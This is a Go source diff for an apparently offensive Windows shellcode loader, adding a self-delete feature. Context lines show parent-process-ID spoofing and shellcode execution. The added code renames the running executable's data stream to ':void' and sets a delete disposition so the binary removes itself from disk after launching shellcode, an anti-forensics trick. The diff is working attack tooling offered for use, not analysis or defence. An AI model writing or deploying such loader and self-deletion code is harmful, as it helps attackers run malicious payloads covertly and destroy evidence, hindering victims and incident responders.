@@ -3,6 +3,7 @@ package main
 import (
 	"context"
 	"crypto/tls"
+	"encoding/binary"
 	"fmt"
 	"io"
 	"net/http"
@@ -64,6 +65,90 @@ func display(url, target string, parent uint, kill bool) {
 	}
 	fmt.Printf("[*] PPID Spoofing: %d\n", parent)
 	fmt.Printf("[*] Kill: %t\n", kill)
+}
+
+func openHandle(filepathw *uint16) windows.Handle {
+	handle, err := windows.CreateFile(filepathw, windows.DELETE, 0, nil, windows.OPEN_EXISTING, windows.FILE_ATTRIBUTE_NORMAL, windows.Handle(0))
+	if err != nil {
+		fmt.Printf("[!] CreateFile: %s\n", err.Error())
+		os.Exit(1)
+	}
+	if int(handle) == -1 {
+		fmt.Println("[!] CreateFile: unable to open handle")
+		os.Exit(1)
+	}
+	return handle
+}
+
+func renameHandle(handle windows.Handle, newName []uint16, newLen uint32) {
+	fileRenameInfoSize := uint32(24)
+	totalLen := fileRenameInfoSize + newLen
+	renameInfo := make([]byte, totalLen)
+	binary.LittleEndian.PutUint32(renameInfo[0x10:], newLen)
+	for i := uint32(0); i < newLen; i += 2 {
+		binary.LittleEndian.PutUint16(renameInfo[0x14+i:], newName[i/2])
+	}
+	err := windows.SetFileInformationByHandle(handle, windows.FileRenameInfo, &renameInfo[0], totalLen)
+	if err != nil {
+		fmt.Printf("[!] SetFileInformationByHandle: %s\n", err.Error())
+		os.Exit(1)
+	}
+}
+
+func dispositionHandle(handle windows.Handle) {
+	dispositionInfo := []byte{1}
+	err := windows.SetFileInformationByHandle(handle, windows.FileDispositionInfo, &dispositionInfo[0], uint32(len(dispositionInfo)))
+	if err != nil {
+		fmt.Printf("[!] SetFileInformationByHandle: %s\n", err.Error())
+		os.Exit(1)
+	}
+}
+
+func exists(path string) (bool, error) {
+	_, err := os.Stat(path)
+	if err == nil {
+		return true, nil
+	}
+	if os.IsNotExist(err) {
+		return false, nil
+	}
+	return false, err
+}
+
+func selfDelete() {
+	filename := make([]uint16, 256)
+	_, err := windows.GetModuleFileName(0, &filename[0], uint32(len(filename)*2))
+	if err != nil {
+		fmt.Printf("[!] GetModuleFileName: %s\n", err.Error())
+	}
+	newName := ":void"
+	newNameW, err := syscall.UTF16FromString(newName)
+	if err != nil {
+		fmt.Printf("[!] syscall.UTF16FromString: %s\n", err.Error())
+		os.Exit(1)
+	}
+	hCurrent := openHandle(&filename[0])
+	fmt.Println("[+] Attempting file renaming")
+	renameHandle(hCurrent, newNameW, uint32(len(newName)*2))
+	fmt.Println("    Successfully rename file")
+	windows.CloseHandle(hCurrent)
+
+	hCurrent = openHandle(&filename[0])
+	fmt.Println("[+] Setting up delete disposition info")
+	dispositionHandle(hCurrent)
+	windows.CloseHandle(hCurrent)
+
+	fname := syscall.UTF16ToString(filename)
+	isExist, err := exists(fname)
+	if err != nil {
+		fmt.Printf("[!] Unable to check if file exists: %s\n", err.Error())
+		os.Exit(1)
+	}
+	if !isExist {
+		fmt.Println("[+] File deleted successfully")
+	} else {
+		fmt.Println("[!] Fail to self delete")
+	}
 }
 
 func spawnProcess(target string, parent uint, pi *windows.ProcessInformation) {
@@ -189,6 +274,10 @@ func main() {
 		os.Exit(1)
 	}
 	fmt.Println("    Executing shellcode")
+
+	if opts.Kill {
+		selfDelete()
+	}
 
 	defer func() {
 		fmt.Println("[+] Closing thread handle")
